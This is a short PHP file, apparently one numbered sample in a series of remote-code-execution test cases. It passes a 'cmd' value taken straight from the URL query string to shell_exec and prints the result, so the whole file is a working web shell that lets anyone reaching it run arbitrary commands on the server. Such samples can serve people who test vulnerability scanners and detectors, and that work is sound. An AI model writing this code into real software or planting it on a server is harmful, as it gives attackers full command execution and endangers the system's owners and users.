<?php
// RCE test variation #1366
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>